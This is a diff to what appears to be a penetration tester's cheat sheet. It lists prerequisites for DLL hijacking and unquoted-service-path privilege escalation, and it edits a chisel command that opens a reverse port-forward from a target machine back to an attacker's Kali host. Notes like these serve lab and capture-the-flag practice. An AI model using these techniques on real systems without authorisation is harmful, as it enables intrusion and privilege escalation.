@@ -80,11 +80,21 @@ and reboot after placing the payload.
 
 ###### DLL Hijacking
 ```
-3 prerequisites:
-Included in a running Process
-Result = "NAME NOT FOUND"
-Path ends with .dll
+Prerequisites:
+- Included in a running Process
+- Result = "NAME NOT FOUND"
+- Path ends with .dll
 ```
+
+###### Unquoted Service Path
+```
+Prerequisites:
+- Write access in the right folder
+- Ability to either restart the service or trigger a re-start by rebooting
+If you want to privesc also check:
+- Does the service run as a high(er) privileged user?
+```
+
 
 ###### Port Forwarding
 ```
@@ -95,7 +105,7 @@ https://github.com/jpillora/chisel
 $ ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
 
 3 run chisel on the target
-$ .\c.exe client 10.10.14.20:8000 R:8888:localhost:8888
+$ .\c.exe client 192.168.1.1:8000 R:8888:localhost:8888
 
 4 see if the connection is made
 port 8888 on kali should be listening now:
